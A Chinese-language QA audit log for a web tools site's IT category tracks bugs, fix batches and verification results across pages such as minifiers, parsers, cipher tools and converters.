# IT 开发 · tools/it（340 页，全站第一大分类）

## IT-N417 其余运营商号段准确性待核

- `tools/it/msisdn-lookup.html`：已确认的转售号段误报见 `plan/复核失败/2026-11-09-第一批.md`；其余运营商号段尚未逐码核验，原交接留存的未核实余项移回分类清单，不能当作已修通过。原交接可从 Git 历史查看。

## 2026-11-06 已修条目独立复核（O-1/O-2/P-06）

- **IT-N143 / P-06：原列置换问题已修复。** 抽取 `tools/it/adfgvx-cipher.html` 实际函数，用 `CIPHER`、`FRANCE`、`LEMON` 三个密钥对 `ATTACKATDAWN` 加解密均还原原文。`order.indexOf(i)` 修正列回填；测试为 DOM 桩，未运行浏览器。补位问题 IT-N144 已于第254批一并修复（密文附 `~P<n>` 标记、解密剥离），均已销账。

## 2026-11-06 文本差异工具静态续审（清单 634）

- `tools/text/calc-1.html:218-225,245-287`：任一文本改动都同步建立行数乘积大小的 LCS 矩阵并完整重算，大文本可能占用大量内存或阻塞界面；拼出的正常差异文本只要包含独立 `NaN` 或 `Infinity` 字样，就被数值守卫替换成“计算结果含无效值”，无法比较这些普通文本。未运行浏览器或压力测试。

## 2026-11-06 IT 工具静态续审

### CSS 单位基准被忽略且空值静默替换（中，代码确认）
- `tools/it/calc-4.html:129-134,227-240,266-274,379-381`：基准字号为空或为 0 时 `|| 16` 静默当成 16；负数虽被主结果拒绝，复制函数却只检查目标 px，仍能复制负基准计算值。`rem` 恒用 16 除，而预设明确标注「18px根」：基准与目标均 18 时给出 1.125rem，不符合该预设的根字号语义。应区分根字号与父字号，校验并统一复制与显示。

### JWT 解码后敏感令牌写入本地历史（中，实际影响待验证 · 部分修复余项）
- `tools/it/calc-8.html:296-305,358-384,394-396` 和 `js/tool-kit.js:1066-1075,1088-1099`：解码成功后自动采集完整 `jwtInput` 并写 localStorage 历史，无明确的敏感令牌存储提示；不涉及上传结论。应避免持久保存原始令牌或提供明确控制。
- 备注：同条目的 exp 判定子问题已修复并复核；本条仅余敏感令牌历史一项待评估。

### 颜色对比页背景 alpha 被忽略（中 · 部分修复余项，口径待裁断）
- `tools/it/color-converter.html` calcContrast 忽略背景 alpha，透明白色背景被当作不透明白色；应明确底层颜色并先合成背景，或拒绝透明背景。该口径需裁断（合成到底层白/黑，还是拒绝透明背景），未擅改。
- 备注：同条目颜色选择器联动及 CSV 前景 alpha 口径已修复并复核；本条仅余背景 alpha 一项。

### JS 简化器默认压缩修改字符串和保留旧结果（高，代码确认）
- `tools/it/js-minifier.html:176,383-430` 即使 tokenize 区分字符串和正则，最后仍对整段输出全局替换空白及运算符。Node 抽取页面原函数复算：`const text = "a  b";` 被压成 `const text="a b";`，字符串数据改变。应仅在 token 间压缩，生产使用仍需真正的解析器。
- `:189,445-459,462-491` 输入变化只重置统计，不清空输出；选择示例亦仅重置统计，复制仍读取前次结果。应在输入变化时清空旧结果或明确标记过期。

### Less 异步编译结果可能覆盖新状态（中，代码确认；竞态待运行验证）
- `tools/it/less-compiler.html:531-581,585-589,616-625,641-648` 的 `less.render()` 回调没有版本或输入一致性检查；多个编译先后完成顺序反转时旧结果可覆盖新结果，清空后仍在途的成功回调也可重新填充输出及复制缓存。输入刚编辑而防抖未触发期间，复制/下载仍读取上次的 `lastCompiledCSS`。应使过时任务失效并标记或清除旧输出；未验证实际异步完成顺序。

### Robots 规则重建将用户输入拼入 HTML（高，代码确认；可利用性待验证）
- `tools/it/robots-txt-generator.html:247-268,272-287`：编辑 User-agent、Allow 或 Disallow 时先保存到 `rules`；点击「新增规则组」会将用户输入未经转义插入属性或 textarea 的 HTML，再赋给 `innerHTML`。引号或 `</textarea>` 能改变生成的 DOM；应安全设置属性和文本。未运行注入，也未确认外部诱导或脚本执行条件。
- 同处 `:261-268` 对整个 HTML 匹配 `Infinity` 或独立 `NaN`，路径含这些合法文本时新增规则会将全部规则控件替换成数值错误提示；后续直接点击新增仍会命中相同数据。应移除文本数值守卫并保持界面与状态一致。

### 文本统计总词数口径待裁断（中，口径待定）
- `tools/it/text-statistics.html:264,284-297` 的「总词数」取过滤停用词后的 `allWords.length`，输入 `the` 的英文词数为 1、总词数却为 0；应将总词数与排除停用词后的词频统计分开标注或计算。页面 formula-eq 现明确写「总词数 = 中文单字 + 英文词（过滤停用词）」，改口径须三源同步并裁断，未擅动。
- 备注：原型属性词频 bug（`wordFreq={}` 遇 constructor 得 NaN）已于第282批改 `Object.create(null)` 真机验证并销账，verify 强锁 1689/1689；本条仅余总词数口径一项。

### TypeScript 编译器加载失败时诊断自身可能抛错（中，代码确认）
- `tools/it/typescript-compiler.html:770-784,639-659` 等待加载超时后调用 `showDiagnostics()`，而该函数仍直接调用 `ts.flattenDiagnosticMessageText`；若库始终未加载，`ts` 未定义，异常阻止加载失败信息写入界面，原「加载中」状态可能保留。应在缺库时显示无需依赖 `ts` 的错误；未模拟资源失败或运行页面。
- `:742-748,712-723` 输入变化后防抖 300ms 才编译，在这段时间点击复制或下载仍取上次输出；应标记输出过期或在复制/下载前同步编译。

### 历史结论状态
- Unicode 查询 IT-N554–N556 已于第212批真机验证并销账：U+/0x 码点检索、1342 条标准名称表、`data-code` 复制均在位。
- 原文本统计 IT-N39 已于第243批销账：字素簇统计 + 码点数分列、句号保护小数与缩写、裸 CR 切行均已真机回归。本批另阅读 SQL、SQLite、tmux 速查及字符串混淆主要交互，未穷举内容正确性或运行页面。
- 正则转义 IT-N58 已于第246批真机复核销账：非法/越界转义校验后保留字面、不抛异常。IT-N59 的额外元字符集合仍在，风格下拉也未绑定变更刷新。
- Rust 转义 IT-N338 旧字节串非法 `\u{}` 路径已变化，当前 `tools/it/rust-escape.html:287-295` 明确拒绝非 ASCII；未运行编译回归，不正式销账。本批另阅读 REST、Ruby、Rust 速查搜索、分类和复制，未穷举语法正确性或运行页面。
- 番茄钟 IT-N480、N481 已改为时间戳计时与跳过不落账并销账（第181批）；Redis IT-N543、N544 的原示例尚需独立复核（正则速查 IT-D30 已独立复核并修复，第170批）。本批另阅读 PostgreSQL、Python、Redis、正则速查的搜索、分类与复制，不把源码阅读当作运行通过。
- 密码强度 IT-N536–N538 已于第214批真机验证并销账：三档破解速率标签与除数一致（10亿/1000亿/1万亿 与 seconds、/100、/1000 同步）、熵判读按 <40/<60/<120 阈值单列且与清单等级并存、弱点清单（常见片段/重复/序列）提示到位；MySQL、Nginx、PHP 速查历史示例正确性仍待单独复核。
- IT-N288/N289/N290 已于第211批真机回归并销账：XSS 防护（escAttr + safeUrl 协议白名单）与 GFM 任务清单复选框均在位，`#` 已改渲染 h1。
- 同批阅读 Linux、MongoDB 速查的搜索、分类与复制路径；无浏览器验证，不对完整正确性判通过。IT-N498–N500 的示例仍须按具体内容另行运行复核。
- IT-N423 的数据范围问题仍在（N308/N309 已于第242批销账：country-flag 引据改 ISO 3166-1 口径 + 空结果双语提示）。
- IT-N49 已于第215批真修并销账：`chmod-calculator` 支持 setuid(4)/setgid(2)/sticky(1) 特殊位与四位数模式（如 4755/2755/1777），符号位按 s/S 与 t/T 分别渲染，快捷预设及复制命令同步；JSDOM 修好版 18/18、旧源码 3/18。
- IT-N170–N173 第217批销账（`calc-3`）、IT-N174–N177 第218批（`matrix-transpose`）、IT-N178–N180 第219批（`http-cookies` 与 4 个 HTTP 页过期示例）、IT-N181–N184 第220批（`text-to-ascii`）、IT-N185–N190 第221批（`shell-script-formatter`）、IT-N191–N195 第222批（`unit-converter-advanced`）、IT-N196–N198 第223批（`html-entities-encode`）、IT-N199–N201 第224批（`json-to-toml`）、IT-N202–N206 第225批（`plist-parser` 与 `char-encoder`）、IT-N207–N211 第226批（`char-encoder` 实体补全与 `basic-auth-generator` 冒号/charset）、IT-N212–N216 第227批（`nanoid-generator` 与 `markdown-table-generator`）、IT-N217–N221 第228批（`markdown-table-generator` CSV 解析与 `wifi-qr-generator` 改名），详见下方覆盖行；IT-N222–N226 第229批（`phone-screen-sizes` 页签默认态/DPR 列/描述去重、`rabbit` RFC 4503 全量对齐与 32 hex 密钥语义）；IT-N227 与 IT-N230–N232 第230批（`rabbit` 严格 IV/解密格式、`sms-qr` 真实 QR 补证据与号码校验/NaN 守卫移除）；IT-N228/N229 与 IT-N233–N235 第231批（MySQL 8.0 语法纠偏、hypothesis-test 单尾效能与远尾 p 精度），详见移交档。
- 同批另阅读 `ascii-table`、`box-shadow-generator`、`calc-1`、`calc-10` 的主要交互路径；未对其完整正确性或浏览器行为作通过判定。

## 已知问题
### I1. hash/编码类页深度参差
- ⚠ 核实（2026-10-26）：pbkdf2 已完整参数化（迭代/盐/密钥长度/格式）、bcrypt 已有 rounds 成本因子——「参数化」部分条目过时。


## 优化点（G06 联动）
- S6 输入智能化：※ cron「人类语翻译」双向（2026-10-26 落地）+ regex-common「原文高亮+命中偏移明细」（2026-10-26 落地：matchAll 逐段 <mark> + `#i [s-e] 文本` 位置表；⚠ 默认态样例也产高亮标题，标题不可单独作锚）。「正则速查输入联想」核实销案（2026-10-26）：regex-cheatsheet 既有实时搜索过滤（searchInput input → renderCommands 全量重渲染），「输入即响应」已实现，增量价值不足，不再单列。
- S3 分步：base64/进制约 30 页加「逐步位运算」可视化。
- 高流量页优先做 S4 分享卡（uuid/password/hash）。

## 受影响范围
- tools/it/（340 页，全站第一大分类）

## 进度
- 🟢 批次 2026-10-26：I1 耗时实测、I2 toml-formatter 严格校验、I3 barcode PNG 导出均已落地。
- 🔴 待开发：S4 分享卡。（注：QR 中心 logo、纠错级别对比、S6 正则速查输入联想均已落地/销案，见上方已修复归档）

## 2026-11-03 审计补充（按工作树静态核查）

- `toml-formatter`：IT-N1 验证/格式化/转换已统一走严格 `parseToml`（TOML 1.0 语法子集），裸值 `a = nope`、重复键 `a=1/a=2` 一律抛错并显示行号，三条入口（validateToml / formatToml / tomlToJson）一致拒绝、不再静默把非法内容"修"成合法；三引号多行字符串完整保留行间换行。源码已由其他 Agent 修好，清单漏销账，第213批补真机证据 13/13，缺陷态注入（换回宽松逐行解析）2/13（11 项红）。本批未改源码。


### 覆盖
- 本轮人工查看 `tools/it/toml-formatter.html`、`tools/it/ast-viewer.html`、`tools/it/jwt-parser.html` 共 3 页，TOML 执行原函数取证；未逐页审计其余 IT 页面，未做真实浏览器测试或重跑门禁。

## 2026-11-03 续查：文本与配置工具

### 续查覆盖
- 新抽查 `tools/it/env-generator.html`、`tools/it/json-to-csv.html`、`tools/it/number-base-converter.html`、`tools/it/text-replace.html`、`tools/it/nginx-config-generator.html` 共 5 页，新增 7 条问题（历史计数）；未做浏览器、部署或门禁验证。历史回填的实际交互需真机复核。

## 2026-11-03 续查（并行批 G）


### 留存优化
- `tools/it/list-converter.html:262`：裸 CR 切分已支持（第260批补真机证据）；`map(trim).filter(Boolean)` 仍静默丢弃空项与行首/行尾缩进，需补「保留空项/缩进」开关。
- `properties-parser.html:298` 的 `unescapeVal` 不解码 `\uXXXX`：`greet=\u4f60\u597d` 原样保留（Node 已复算），与页面 FAQ 对转义的说明不一致。
- `properties-parser.html:265` 行尾 `\\`（字面反斜杠）也被当作续行：`path=C:\\` + 下一行 → `{"path":"C:\next=1"}`，需区分“单个反斜杠续行 / 双反斜杠字面量”。
- `url-parser.html:442-459` 构造器不校验 host/port，host 为空会生成 `https:///path`，端口可写入任意非数字内容。
- `slugify.html:315` 拼音表 `'音频':'yinpinyin'` 拼写有误；297 的 15 字长键因贪心上限 8（324）永远匹配不到，属冗余数据。
- `text-truncate.html:330` `fromEnd` 分支完全忽略 `wordBoundary`，与正向行为不对称。
- `case-converter.html:384` `toSentenceCase` 先整体小写，专有名词与缩写（NASA、iOS）会被降格，如需保留应改为逐句首字母处理。

### 续查覆盖
- 本轮人工查看 `tools/it/properties-parser.html`、`url-parser.html`、`csv-validator.html`、`curl-parser.html`、`text-truncate.html`、`slugify.html`、`case-converter.html` 共 7 页，新增 8 条（高 3、中 4、低 1），编号续 IT-N10～N17，与既有 IT-N1～N9 无重复。
- 取证方式仅为源码静态阅读 + Node 内存提取原函数/最小 DOM 桩执行复算；未做真实浏览器交互、英文态、移动端、门禁或部署验证。

## 2026-11-03 续查（并行批 J）






### 留存优化
- `tools/it/text-cleaner.html:531-535`：空输入时 `executeClean` 提前返回，上一次结果与统计原样保留，易被误复制；建议清空结果或提示。
- `tools/it/text-cleaner.html:668-676`：`swapText` 只刷新原始字符数，“结果/减少”统计仍是交换前的值。
- `tools/it/whitespace.html:227-228`：空文本勾选“确保末尾单个换行”会输出单个 `"\n"`（Node 已复算），建议空文本直接输出空串。
- `tools/it/text-diff.html:412-421`：没有换行符统一选项，但 352 的 FAQ 建议“先统一换行符再比对”，本页无法完成该前置步骤；`renderUnifiedDiff:552-554` 的相同行只渲染旧文本，忽略大小写/空白时展示与右侧不一致。
- `tools/it/text-diff.html:304`：统计卡宣称算法为 Myers，实际实现是 LCS 动态规划，文案与实现不一致。
- `tools/it/line-ending-converter.html:350-355`：`clearLe` 未清空 `#leViz`，清空后仍残留上一次的换行可视化；`299-305` 主换行符并列时固定优先报 CRLF。
- `tools/it/list-converter.html:280`：quote 模式用 `\"` 转义双引号，与 FAQ（`201-206`）所述“CSV 双引号写两个”不一致，建议统一或改名。
- `tools/it/ini-parser.html:321`：`getIndent` 读取不存在的 `#indent`，现为死代码，若被调用会抛错。
- `tools/it/markdown-to-html.html:291-293`：行内代码先替换再跑粗体/斜体，`` `**x**` `` → `<code><strong>x</strong></code>`（Node 已复算）；`280` 代码块语言只允许字母，`c++`/`c#` 不被保护（Node：blocks 长度 0）；`310` 表格要求行首为 `|`，省略首竖线的 GFM 表格不识别。
- `tools/it/text-dedupe-sort.html:380-385`：无 `input` 监听，“原始项数”在编辑时不更新；`500-503` 行号补零宽度只按总行数位数，跨 9/10 行时前缀宽度变化。

### 续查覆盖
- 本轮人工查看 `tools/it/text-diff.html`、`whitespace.html`、`text-cleaner.html`、`text-dedupe-sort.html`、`line-ending-converter.html`、`list-converter.html`、`markdown-to-html.html`、`ini-parser.html` 共 8 页，新增 14 条（历史计数：高 2、中 10、低 2），编号续 IT-N18～N31，与既有 IT-N1～N17 无重复；其中 IT-N31 为待验证项。
- 取证方式为源码静态阅读 + Node 内存提取原函数/最小逻辑复算（含 `markdown inline`、`parseIni`、`removeLineNum`、`leViz`、`list convert`、`calcTool` 等价实现），并用本地已装 jsdom 复核 `textarea.textContent` 与空 `<select>` 的 `options.length`；未开浏览器，未做英文态、移动端、门禁或部署验证。

## 2026-11-03 续查（并行批 K）

> 范围：本轮阅读 8 页（`tools/it/xml-formatter.html`、`tools/it/html-entities.html`、`tools/it/text-statistics.html`、`tools/text/stats-1.html`、`tools/text/analysis-density.html`、`tools/text/reading-time-estimator.html`、`tools/text/sensitive-word-filter.html`、`tools/text/text-extract-phones.html`）。仅源码 + Node/jsdom 复算，未开浏览器/未做 EN/移动端/门禁验证。

- 本轮实读 8 页：`tools/it/xml-formatter.html`、`tools/it/html-entities.html`、`tools/it/text-statistics.html`、`tools/text/stats-1.html`、`tools/text/analysis-density.html`、`tools/text/reading-time-estimator.html`、`tools/text/sensitive-word-filter.html`、`tools/text/text-extract-phones.html`；新增 8 条（高 1 / 中 5 / 低 2）；未覆盖：`tools/text` 其余 7 页（`lorem-ipsum-generator`、`text-to-1337`、`text-to-ascii-art`、`text-to-braille`、`convert-6`、`convert-7`、`calc-1`）及 `tools/it` 的 json/yaml/csv/xml 转换余页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 L）

> 范围：本轮阅读 8 页（`tools/it/time-format-converter.html`、`tools/it/timestamp-converter.html`、`tools/it/color-converter.html`、`tools/it/integer-base-converter.html`、`tools/it/chmod-calculator.html`、`tools/it/crontab-generator.html`、`tools/it/ipv6-converter.html`、`tools/it/crc-calculator.html`）。仅源码 + Node 复算，未开浏览器/未做 EN/移动端/门禁验证。



- 本轮实读 8 页：`tools/it/time-format-converter.html`、`tools/it/timestamp-converter.html`、`tools/it/color-converter.html`、`tools/it/integer-base-converter.html`、`tools/it/chmod-calculator.html`、`tools/it/crontab-generator.html`、`tools/it/ipv6-converter.html`、`tools/it/crc-calculator.html`；新增 16 条（高 3 / 中 10 / 低 3）；未覆盖：`tools/it` 其余非文本页（如 `regex-escape`、`css-minifier`、`html-minifier`、`date-duration`、`ipv4-range-expander`、`punycode`、`user-agent-parser` 等）与全部速查表页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 M）

> 范围：本轮阅读 8 页（`tools/it/punycode.html`、`tools/it/regex-escape.html`、`tools/it/css-minifier.html`、`tools/it/date-duration.html`、`tools/it/ipv4-range-expander.html`、`tools/it/user-agent-parser.html`、`tools/it/hash-multi.html`、`tools/it/http-cache.html`）。仅源码 + Node/jsdom 复算，未开浏览器/未做 EN/移动端/门禁验证。

- 备注：`tools/it/punycode.html:404-410`、`tools/it/regex-escape.html:321-328` 的 `copyResult` 依赖全局 `event`（与 IT-N31 同模式，Firefox 可能失效），不重复计数，未单列为新条目。
- 本轮实读 8 页：`tools/it/punycode.html`、`tools/it/regex-escape.html`、`tools/it/css-minifier.html`、`tools/it/date-duration.html`、`tools/it/ipv4-range-expander.html`、`tools/it/user-agent-parser.html`、`tools/it/hash-multi.html`、`tools/it/http-cache.html`；新增 15 条（高 3 / 中 8 / 低 4）；未覆盖：`tools/it` 其余非文本页（如 `html-minifier`、`html-nesting-checker`、`c-string-escape`、`go-escape`、`java-escape`、`js-minifier`、`js-obfuscator`、`sql-formatter`、`shell-script-formatter`、`dockerfile-generator`、`gitignore-generator`、`robots-txt-generator`、`sitemap-generator`、`ssh/证书/密钥类` 等）与全部速查表页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 N）

> 范围：本轮阅读 8 页（`tools/it/ip-calculator.html`、`tools/it/html-minifier.html`、`tools/it/barcode-ean.html`、`tools/it/docker-run-converter.html`、`tools/it/cron.html`、`tools/it/qr-decoder.html`、`tools/it/url-encode.html`、`tools/it/base64-converter.html`）。仅源码 + Node 复算，未开浏览器/未做 EN/移动端/门禁验证。


- 本轮实读 8 页：`tools/it/ip-calculator.html`、`tools/it/html-minifier.html`、`tools/it/barcode-ean.html`、`tools/it/docker-run-converter.html`、`tools/it/cron.html`、`tools/it/qr-decoder.html`、`tools/it/url-encode.html`、`tools/it/base64-converter.html`；新增 15 条（高 2 / 中 12 / 低 1）；未覆盖：`tools/it` 其余非文本页（如 `base32-encode`、`base58-encode`、`base85-encode`、`http-headers`、`http-status`、`http-methods`、`mime-type`、`gitignore-generator`、`dockerfile-generator`、`shell-script-formatter`、`ipv6-ula`、`ssl-info`、`aes/des/rsa/ecdsa` 等）与全部速查表页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 O）

范围：本分区「01 IT：非文本类剩余」8 页（`ipv6-ula` / `ssl-info` / `http-status` / `http-headers` / `mime-type` / `aes-encryptor` / `rsa` / `base32-encode`），编号接续 IT-N85，从 IT-N86 起。

- 留存建议（ssl-info）：①增加"粘贴 PEM 证书离线解析"（SAN/有效期/颁发者/密钥用法），比纯口诀更实用；②强度估算增加"所需算力/电费量级"与"推荐算法"结论；③补 SSL3/TLS1.0-1.3 对照与常见配置错误清单，并提供可复制的 Nginx 配置片段。

- 留存建议（http-status）：①补 301/302/307/308 与 401/403/404/410 的决策对照表；②支持"复制整行/导出全量 CSV"（当前导出只导当前筛选且需先点导出才渲染表）；③增加常见框架默认页（Nginx/Tomcat/Spring）对应状态码的排查提示。

- 留存建议（http-headers，N106 标题口径已于第267批完成）：①增加"请求/响应/通用"方向过滤与 CORS/缓存/安全三组场景预设；②每条支持复制 curl/Node/fetch 片段（当前仅复制单行示例）；③补 Cache-Control/HSTS/CSP 后提供"安全响应头基线"清单。



- 留存建议（mime-type）：①提供"反向查询"（输入 `application/json` → 推荐扩展名）；②数据表按分类分组并支持导出全量 CSV；③每条给 Nginx/Apache 的 `types` 配置片段一键复制；④补 `charset`/`nosniff` 配置示例。

- 留存建议（base32-encode）：①补 Base32hex / Crockford / z-base-32 的字母表对照与切换（页面已提"不可混用"）；②结果区显示字符数/填充数（当前无任何统计）；③提供编码→解码一键往返校验与非法样例提示。

- `ipv6-ula`：无剩余缺陷（IT-N113 上限提到 50 并同步公式/预设、IT-N114 改 `crypto.getRandomValues` 且无安全源时显式告警、IT-N115 fd=8 位/40 位全局 ID/16 位子网三源同步、IT-N116 加复制全部按钮且导出改为本次前缀 CSV，四项均已销账，第195批；verify 5 条强锁 + JSDOM 真机 28/28、旧源码 18/28）。
- 留存建议（ipv6-ula）：①增加"固定前缀 + 子网 ID 位数"可配置（当前子网恒为 0）；②支持生成多子网（`/48` → 多个 `/64`）与 JSON/CSV 清单导出；③提供"复制 curl/配置片段"（如 `ip -6 addr add`）。

- 备注：`tools/it/mime-type.html:368` 与 `tools/it/base32-encode.html:309` 的复制按钮仍依赖 Chrome 专有全局 `event`（Firefox/程序化调用会失效，与 IT-N31 同模式），不重复计数、未单列。
- 本轮实读 8 页：`tools/it/ipv6-ula.html`、`tools/it/ssl-info.html`、`tools/it/http-status.html`、`tools/it/http-headers.html`、`tools/it/mime-type.html`、`tools/it/aes-encryptor.html`、`tools/it/rsa.html`、`tools/it/base32-encode.html`；新增 31 条（高 2 / 中 17 / 低 12）；未覆盖：本分区其余非文本页（`base58-encode`、`base85-encode`、`http-methods`、`gitignore-generator`、`dockerfile-generator`、`shell-script-formatter`、`aes/des/ecdsa` 等）与全部速查表页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 P）

范围：只读实读 8 页（`tools/it/base58-encode.html`、`base85-encode.html`、`barcode-code128.html`、`barcode-upc.html`、`bluetooth-version.html`、`usb-version.html`、`ascii-table.html`、`caesar-cipher.html`），编号接续 IT-N117。所有数值结论均用 `node -e` 按页面源码逻辑（或 `/js/barcode-lib.js`）复算；未开浏览器、未跑构建/门禁、未做 EN/繁体/移动端验证。上一轮已记入 IT-N110/111/112 的 Base32 同型问题不作为本轮重复项。

- 留存建议（base58-encode）：①补"文本 / Hex 字节"双模式，真正兑现 meta；②结果区显示字符数与字节数；③支持 Base58Check（双 SHA-256 前 4 字节）校验，或明确标注"仅纯 Base58、不校验地址"。

- 留存建议（base85-encode）：①在 UI 明示 Z85 需 4 字节对齐（当前仅预设改用合规样例）；②结果区显示"字符数 / 膨胀率"并支持 `<~ ~>` 可选开关。

- 留存建议（code128-encode）：①实现 A/B/C 三者最优切换（当前仅 A/B 动态切换、纯偶数数字用 C）；②增加 SVG 导出与静区宽度提示（当前仅 PNG 且 quiet 固定 10）；③补 FNC1/GS1-128 的"暂不支持"明示，避免 deep-dive 提及但工具无入口。

- 留存建议（barcode-upc）：①删除本地 `buildUPC`，统一走共享库；②补 UPC-E 互转/校验位自动纠正说明，兑现 FAQ 的 UPC-E 提及。

- 留存建议（bluetooth-version）：①选项改由 `BT_INFO` key 驱动生成（当前 HTML 写死，仍是双源）；②"数据表"页签当前切换的是 `#result` 而非 `#bluetooth_versionTable`，建议改为真正的表格面板。

- 留存建议（usb-version）：①option 改由 `USB_INFO` key 驱动生成（当前 HTML 写死，仍是双源）；②补 3.2 Gen1/Gen2/2x2 细分（1.0/1.1 与 3.1 Gen1/Gen2 已补）；③接口建议与协议速率解耦（形态≠速率），并把"数据表"页签指向真正的表格。

- 留存建议（ascii-table）：①扩展区提供 Latin-1 / Windows-1252 双选项（当前统一按 Latin-1 口径并已明确标注）；②补"输入任意字符反查码点"与可打印/控制统计。

- 留存建议（caesar-cipher）：①统一两套历史（自带 localStorage 与 TBKit），去掉重复面板；②历史容量可提到 50；③视觉核对暴力破解列表分页截断。

- 备注：`tools/it/base58-encode.html:327` 与 `tools/it/base85-encode.html:360` 的复制按钮仍依赖 Chrome 专有全局 `event`（Firefox/程序化调用会失效），与 IT-N31 同模式，不重复计数、未单列。`tools/it/barcode-upc.html:245-246` 自建 `L_CODES/R_CODES` 与 `js/barcode-lib.js:101-106` 重复且未加载共享库；N127/N128 的校验缺陷已在本页修复，统一共享库仍列为留存建议。

- 覆盖小结：本轮实读 8 页（base58-encode、base85-encode、barcode-code128、barcode-upc、bluetooth-version、usb-version、ascii-table、caesar-cipher），新增 26 条（高 3 / 中 13 / 低 10），编号 IT-N117~IT-N142。未覆盖：本分区其余约 265 页（含 http-methods、gitignore/dockerfile 生成器、shell-script-formatter、各类加密/编码页与全部速查表页）；未做浏览器、英文态、繁体、移动端、门禁与线上部署验证。

## 2026-11-04 续查（并行批 P-2）

- 范围：`tools/it/` 下 8 个古典密码页（adfgvx-cipher、affine-cipher、atbash-cipher、bacon-cipher、hill-cipher、playfair-cipher、rail-fence-cipher、vigenere-visualizer），逐页完整读取 HTML、内联 JS、deep-dive 与 FAQ；编号续接 P 批第一波最大号 IT-N142，本批新增 IT-N143~IT-N166。
- 方法：纯静态阅读 + `node -e`/`node /tmp/*.js` 按页内算法逐函数复算；未开浏览器、未跑构建、未做 git 写。

- 留存建议（adfgvx-cipher）：①补多组非对合密钥（CIPHER/FRANCE/GERMAN）往返用例并核对 UI 提示；②自定义方阵密钥增加字符唯一性校验（当前仅校验长度 36，重复字符未拦截）。

- 留存建议（affine-cipher）：①补 a=3/5/7/11/15/17/19/21/23/25 与 b=0/25 的往返用例；②映射表在参数非法时已给红字提示，考虑加“当前 a,b 归一化后实际值”显示。

- 留存建议（atbash-cipher）：①补“自反性一键验证”按钮（同一输入连续转换两次比对）；②「ROT13 特例」表述与历史防抖已于第256批完成。

- 留存建议（bacon-cipher）：①映射表补 A/B 大写列（当前只展示 a/b 与 0/1，与 upper 模式不一致）；②24 版解码遇 IJ/UV 当前统一显示为 I/U，可考虑提示「I 或 J」「U 或 V」歧义。

- 留存建议（hill-cipher）：①LN 算例、②矩阵元素 mod 26 与整数校验、③删除 3×3 承诺并显示规范化矩阵，均已于第258批完成。
- 留存建议（hill-cipher）：①修正 LN 算例；②矩阵元素统一 mod 26 并校验整数；③补 3×3 或删掉该承诺，同时在“矩阵信息”里显示规范化后的矩阵。

- 留存建议（rail-fence-cipher）：“保留空格”旁注明空白也参与置换、解密后位置会改变。

- 备注：`adfgvx-cipher`、`affine-cipher`、`hill-cipher`、`rail-fence-cipher`、`bacon-cipher` 的“复制结果”仍依赖 Chrome 专有全局 `event`（Firefox/程序化调用会失效），与 IT-N31 同模式，未重复计数；8 页的 TBKit `*ResText()` 均读 `textarea` 的 `textContent`（恒空）导致数据表/趋势图/CSV 恒空，与 IT-N140 同类模板缺陷，已在 IT-N140 统一记录，本批不重复编号。

- 覆盖小结：本轮实读 8 页（adfgvx-cipher、affine-cipher、atbash-cipher、bacon-cipher、hill-cipher、playfair-cipher、rail-fence-cipher、vigenere-visualizer），新增 24 条（高 3 / 中 14 / 低 7），编号 IT-N143~IT-N166。未覆盖：本分区其余约 257 页（含全部编码/哈希/格式化/HTTP/Git/Docker 生成器与速查表）；未做浏览器、英文态、繁体、移动端、门禁与线上部署验证。

- `calc-3`（颜色值转换器）：IT-N170–N173 已于第217批真修并销账——三路输入统一钳制（r/g/b 0–255、`h=((h%360)+360)%360`、s/l 0–100，越界回写规范化串，同屏 HEX/RGB/HSL 不再矛盾）；预设同时写 `hexInput` 使统一 `fromHex()` 回调生效（红/蓝/绿由页内 hslToRgb+rgbToHex 反算，往返一致）；删声明式 preset div 并显式放 `#calc_3Presets` 宿主，只留一组 4 条；HEX 支持 3/4/6/8 位（简写按位扩展、4/8 位带 alpha 并展示）、`maxlength` 7→9；公式说明与格式说明中英三源同步。JSDOM `scripts/_verify_it_batch217.mjs` 修好版 22/22、旧源码 3/22；verify 1554/1554 未改。
- `matrix-transpose`（矩阵转置）：IT-N174–N177 已于第218批真机验证并销账。N174/N176/N177 源码已由其他 Agent 修好（`calculate()` 单元格数不符自动 `build()` 保留旧值、`readDims()` 整数+1–6 校验、`getM()` 空/非数抛错并标红、失败分支清空 `__lastTranspose`、`__matrix_transposeExport()` 现场生成 Aᵀ CSV），清单漏销账，本批补证据；N175 残留缺陷真修——`fmt()` 的 `toPrecision(12)` 会把 15 位大整数静默抹成 `123456789012000`，改为整数原样 `String()`、超安全整数走指数表示、非整数才用 12 位有效数字消浮点噪声。JSDOM `scripts/_verify_it_batch218.mjs` 修好版 33/33、缺陷态注入（换回旧 fmt）31/33（大数两项精确变红）；verify 1554/1554。
- `http-cookies`（HTTP Cookie 速查）：IT-N178–N180 已于第219批销账。N178 英文简介已由其他 Agent 改为 "as a searchable quick reference"（不再宣称 Parse and build），与页面仅有搜索+静态速查的能力一致，属漏销账补证据；N179 真修——`Expires=Wed, 21 Oct 2025` 星期错（实算周二）且已过期，全站同类 11 处（http-cookies 1 / http-headers 2 / http-response-headers 3 / http-cache 5）统一换为 `Thu, 21 Oct 2027 07:28:00 GMT`（实算周四、未过期）；刻意保留星期正确的历史示例（1970 epoch 删 Cookie、2015 RFC 原文、2026 条件请求）；N180 真修——`Max-Age` desc/params 补「0 或负数立即删除」语义（中英 en JSON 同步），明细表 `th1` 按 `en` 切换 `Attribute/属性`。JSDOM `scripts/_verify_it_batch219.mjs` 修好版 19/19、旧源码差分 9/19（10 项红）；verify 1554/1554、deepdive sync 0 不一致。
